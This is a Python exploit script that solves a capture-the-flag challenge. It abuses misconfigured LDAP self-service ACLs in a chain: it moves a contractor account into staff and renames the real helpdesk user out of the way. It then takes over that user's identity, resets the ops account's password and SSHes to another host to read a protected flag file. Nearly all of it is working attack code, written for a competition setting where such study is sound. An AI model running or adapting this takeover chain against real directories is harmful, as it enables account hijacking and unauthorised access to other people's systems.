#!/usr/bin/env python3
"""Exploit the Self-service LDAP ACLs and retrieve the srv2 flag."""

from __future__ import annotations

import os
import re
import socket
import time
from pathlib import Path
from typing import Callable

import paramiko


HOST = os.environ.get(
    "SELF_SERVICE_HOST", "self-service-34898d692cec.chall.nnsc.tf"
)
PORT = 1337
DIRECTORY_URI = "ldap://dir:3389"
BASE_DN = "dc=corp,dc=nns"
CONTRACTORS_DN = f"ou=contractors,{BASE_DN}"
STAFF_DN = f"ou=staff,{BASE_DN}"
EREID_CONTRACTOR_DN = f"uid=ereid,{CONTRACTORS_DN}"
EREID_STAFF_DN = f"uid=ereid,{STAFF_DN}"
AGRANT_DN = f"uid=agrant,{STAFF_DN}"
FINAL_DN = AGRANT_DN
OPS_DN = f"uid=ops,{STAFF_DN}"

EREID_PASSWORD = os.environ.get("SELF_SERVICE_PASSWORD", "Summer2026")
OPS_PASSWORD = os.environ.get("OPS_PASSWORD", "OpsRestore2026")
FLAG_PATH = Path(__file__).resolve().parents[1] / "flag.txt"
FLAG_RE = re.compile(r"NNS\{[^}\r\n]+\}")


def extract_flag(output: str) -> str:
    """Extract the first flag from shell output containing terminal noise."""

    match = FLAG_RE.search(output)
    if not match:
        raise ValueError("flag not found in command output")
    return match.group(0)


def moddn_ldif(
    dn: str, newrdn: str, delete_old_rdn: bool, newsuperior: str | None = None
) -> str:
    """Build an LDIF ModifyDN record."""

    lines = [
        f"dn: {dn}",
        "changetype: moddn",
        f"newrdn: {newrdn}",
        f"deleteoldrdn: {int(delete_old_rdn)}",
    ]
    if newsuperior is not None:
        lines.append(f"newsuperior: {newsuperior}")
    return "\n".join(lines) + "\n"


def replace_ldif(dn: str, name: str, value: str) -> str:
    """Build an LDIF single-attribute replacement record."""

    return (
        f"dn: {dn}\n"
        "changetype: modify\n"
        f"replace: {name}\n"
        f"{name}: {value}\n"
    )


def is_final_actor(username: str, bind_dn: str) -> bool:
    """Return whether the known-password takeover DN is already active."""

    return username == "agrant" and bind_dn == FINAL_DN


def connect(username: str, password: str) -> paramiko.SSHClient:
    """Connect to the TLS-wrapped SSH service."""

    proxy = paramiko.ProxyCommand(f"openssl s_client -quiet -connect {HOST}:{PORT}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=HOST,
            port=PORT,
            username=username,
            password=password,
            sock=proxy,
            timeout=20,
            banner_timeout=20,
            auth_timeout=20,
            look_for_keys=False,
            allow_agent=False,
        )
    except Exception:
        client.close()
        raise
    return client


def ldap_modify(
    client: paramiko.SSHClient, bind_dn: str, password: str, ldif: str
) -> None:
    """Apply an LDIF record through the remote ldapmodify client."""

    command = f"ldapmodify -x -H {DIRECTORY_URI} -D '{bind_dn}' -w '{password}'"
    stdin, stdout, stderr = client.exec_command(command, timeout=30)
    stdin.write(ldif)
    stdin.flush()
    stdin.channel.shutdown_write()
    out = stdout.read().decode(errors="replace")
    err = stderr.read().decode(errors="replace")
    status = stdout.channel.recv_exit_status()
    if status != 0:
        raise RuntimeError(f"ldapmodify failed ({status}): {out}{err}")


def ldap_search(
    client: paramiko.SSHClient,
    bind_dn: str,
    password: str,
    base: str,
    ldap_filter: str,
    attributes: str = "dn",
    scope: str = "sub",
) -> str:
    """Run a remote ldapsearch and return its combined output."""

    command = (
        f"ldapsearch -x -LLL -H {DIRECTORY_URI} -D '{bind_dn}' -w '{password}' "
        f"-b '{base}' -s {scope} '{ldap_filter}' {attributes}"
    )
    stdin, stdout, stderr = client.exec_command(command, timeout=30)
    out = stdout.read().decode(errors="replace")
    err = stderr.read().decode(errors="replace")
    status = stdout.channel.recv_exit_status()
    if status != 0:
        raise RuntimeError(f"ldapsearch failed ({status}): {out}{err}")
    return out + err


def authenticated_bind(
    client: paramiko.SSHClient, bind_dn: str, password: str
) -> bool:
    """Check that a candidate SSH identity also binds to its expected LDAP DN."""

    try:
        ldap_search(
            client,
            bind_dn,
            password,
            bind_dn,
            "(objectClass=*)",
            "dn",
            "base",
        )
    except RuntimeError:
        return False
    return True


def entry_exists(
    client: paramiko.SSHClient, bind_dn: str, password: str, dn: str
) -> bool:
    output = ldap_search(
        client, bind_dn, password, dn, "(objectClass=*)", "dn", "base"
    )
    return re.search(rf"(?m)^dn:\s*{re.escape(dn)}\s*$", output, re.I) is not None


def find_retirement_uid(
    client: paramiko.SSHClient, bind_dn: str, password: str
) -> str:
    """Select a free non-ops UID for the original helpdesk member."""

    for uid in ("agrant-retired", "agrant-retired-2", "agrant-retired-3"):
        candidate = f"uid={uid},{STAFF_DN}"
        if not entry_exists(client, bind_dn, password, candidate):
            return uid
    raise RuntimeError("could not find a free retirement UID")


def recv_until(
    channel: paramiko.Channel,
    predicate: Callable[[str], bool],
    timeout: float,
) -> str:
    """Receive PTY output until a state predicate is satisfied."""

    deadline = time.monotonic() + timeout
    data = bytearray()
    while time.monotonic() < deadline:
        try:
            chunk = channel.recv(65535)
        except socket.timeout:
            continue
        if not chunk:
            break
        data.extend(chunk)
        output = data.decode(errors="replace")
        if predicate(output):
            return output
    output = data.decode(errors="replace")
    raise TimeoutError(f"timed out waiting for remote shell state: {output[-1000:]}")


def has_srv2_prompt(output: str) -> bool:
    """Recognize the interactive ops prompt without depending on its hostname."""

    return (
        re.search(
            r"(?m)(?:^|\n)[^\r\n]*@srv2[^\r\n]*[$#][ \t]*\r?$", output
        )
        is not None
    )


def read_srv2_flag(client: paramiko.SSHClient) -> str:
    """SSH from jump to srv2 as ops and read its protected flag file."""

    channel = client.invoke_shell(term="dumb", width=200, height=40)
    channel.settimeout(0.2)
    try:
        channel.sendall(
            b"ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            b"-o PreferredAuthentications=password -o PubkeyAuthentication=no ops@srv2\n"
        )
        prompt = recv_until(
            channel,
            lambda output: "password:" in output.lower()
            or "permission denied" in output.lower(),
            20,
        )
        if "password:" not in prompt.lower():
            raise RuntimeError(f"srv2 did not request a password: {prompt[-1000:]}")
        channel.sendall((OPS_PASSWORD + "\n").encode())
        auth_output = recv_until(
            channel,
            lambda output: "permission denied" in output.lower()
            or has_srv2_prompt(output),
            20,
        )
        if "permission denied" in auth_output.lower():
            raise RuntimeError(f"ops authentication failed: {auth_output[-1000:]}")

        channel.sendall(b"cat /home/ops/flag.txt\n")
        output = recv_until(channel, lambda text: FLAG_RE.search(text) is not None, 20)
        channel.sendall(b"exit\n")
        return extract_flag(output)
    finally:
        channel.close()


def solve() -> str:
    """Run the LDAP takeover chain and save the recovered flag."""

    client: paramiko.SSHClient | None = None
    username = ""
    bind_dn = ""
    for candidate_username, candidate_dn in (
        ("ereid", EREID_CONTRACTOR_DN),
        ("ereid", EREID_STAFF_DN),
        ("agrant", FINAL_DN),
    ):
        candidate: paramiko.SSHClient | None = None
        try:
            candidate = connect(candidate_username, EREID_PASSWORD)
            if not authenticated_bind(candidate, candidate_dn, EREID_PASSWORD):
                candidate.close()
                candidate = None
                continue
            client = candidate
            candidate = None
            username, bind_dn = candidate_username, candidate_dn
            break
        except Exception:
            if candidate is not None:
                candidate.close()
            continue
    if client is None:
        raise RuntimeError("could not connect with the supplied credentials")

    try:
        # Convert the contractor into staff if that is still the current DN.
        if username == "ereid" and bind_dn == EREID_CONTRACTOR_DN:
            ldap_modify(
                client,
                bind_dn,
                EREID_PASSWORD,
                moddn_ldif(
                    EREID_CONTRACTOR_DN,
                    "uid=ereid",
                    True,
                    STAFF_DN,
                ),
            )
            bind_dn = EREID_STAFF_DN

        # The self-service ACL permits loginShell changes on our own entry.
        if username == "ereid":
            ldap_modify(
                client,
                bind_dn,
                EREID_PASSWORD,
                replace_ldif(bind_dn, "loginShell", "/bin/bash"),
            )

        # Resume safely if the known-password agrant takeover is already done.
        own_final = is_final_actor(username, bind_dn)

        if not own_final and username == "ereid":
            # The UID ACL is accidentally global. Rename the real helpdesk member
            # away; the old helpdesk member DN remains in the group.
            if entry_exists(client, bind_dn, EREID_PASSWORD, AGRANT_DN):
                retired_uid = find_retirement_uid(
                    client, bind_dn, EREID_PASSWORD
                )
                ldap_modify(
                    client,
                    bind_dn,
                    EREID_PASSWORD,
                    moddn_ldif(AGRANT_DN, f"uid={retired_uid}", True),
                )

            ldap_modify(
                client,
                bind_dn,
                EREID_PASSWORD,
                moddn_ldif(bind_dn, "uid=agrant", True),
            )
            bind_dn = FINAL_DN

        # The stale helpdesk DN now points at our known-password entry.
        ldap_modify(
            client,
            bind_dn,
            EREID_PASSWORD,
            replace_ldif(OPS_DN, "userPassword", OPS_PASSWORD),
        )
    finally:
        client.close()

    # Reconnect so the updated /bin/bash loginShell is used for nested ssh.
    final_client = connect("agrant", EREID_PASSWORD)
    try:
        flag = read_srv2_flag(final_client)
    finally:
        final_client.close()

    FLAG_PATH.write_text(flag + "\n", encoding="utf-8")
    print(flag)
    return flag


if __name__ == "__main__":
    solve()
